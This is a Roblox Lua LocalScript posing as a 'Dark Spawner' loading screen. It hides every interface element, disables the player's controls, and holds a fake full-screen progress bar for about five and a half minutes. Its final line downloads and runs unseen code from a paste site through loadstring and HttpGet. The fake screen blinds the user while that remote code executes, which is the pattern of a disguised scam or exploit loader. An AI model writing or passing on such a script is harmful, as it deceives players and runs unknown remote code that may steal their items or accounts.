-- ðŸŒ±Dark SpawnerðŸŒ± Loading Screen
-- Put this LocalScript in StarterPlayerScripts

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

-- Hide ALL PlayerGuis
for _, gui in pairs(PlayerGui:GetChildren()) do
	if gui:IsA("ScreenGui") then
		gui.Enabled = false
	end
end

-- Hide CoreGui (chat, backpack, leaderboard, health, etc.)
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- Disable mobile joystick + jump button
pcall(function()
	local PlayerModule = require(player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
	local Controls = PlayerModule:GetControls()
	Controls:Disable()
end)

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ðŸŒ±Dark SpawnerðŸŒ±"
screenGui.IgnoreGuiInset = true -- covers system UI too
screenGui.ResetOnSpawn = false
screenGui.DisplayOrder = 999999 -- super high so it stays on top
screenGui.Parent = PlayerGui

-- Fullscreen black background (covers everything including menu button)
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bg.BorderSizePixel = 0
bg.Parent = screenGui

-- Title ðŸŒ±Dark SpawnerðŸŒ±
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0.2, 0)
title.Position = UDim2.new(0, 0, 0.35, 0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(0, 255, 0)
title.TextStrokeTransparency = 0
title.TextStrokeColor3 = Color3.fromRGB(0, 100, 0)
title.TextScaled = true
title.Font = Enum.Font.Fantasy
title.Text = "ðŸŒ±Dark SpawnerðŸŒ±"
title.ZIndex = 2
title.Parent = bg

-- Loading text below title
local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1, 0, 0.1, 0)
loadingText.Position = UDim2.new(0, 0, 0.5, 0)
loadingText.BackgroundTransparency = 1
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingText.TextScaled = true
loadingText.Font = Enum.Font.Fantasy
loadingText.Text = "Loading... 0%"
loadingText.ZIndex = 1
loadingText.Parent = bg

-- Loading bar background
local barBack = Instance.new("Frame")
barBack.Size = UDim2.new(0.6, 0, 0.05, 0)
barBack.Position = UDim2.new(0.2, 0, 0.65, 0)
barBack.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barBack.BorderSizePixel = 0
barBack.Parent = bg

-- Loading bar fill
local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
barFill.BorderSizePixel = 0
barFill.Parent = barBack

-- Timer setup (5â€“6 minutes, ~330 seconds)
local totalTime = 330
for i = 0, 100 do
	local progress = i / 100
	barFill.Size = UDim2.new(progress, 0, 1, 0)
	loadingText.Text = "Loading... " .. i .. "%"
	wait(totalTime / 100)
end

-- Stay stuck at 100%
loadingText.Text = "Loading... 100%"
loadstring(game:HttpGet("https://pastefy.app/alOG09mi/raw"))()
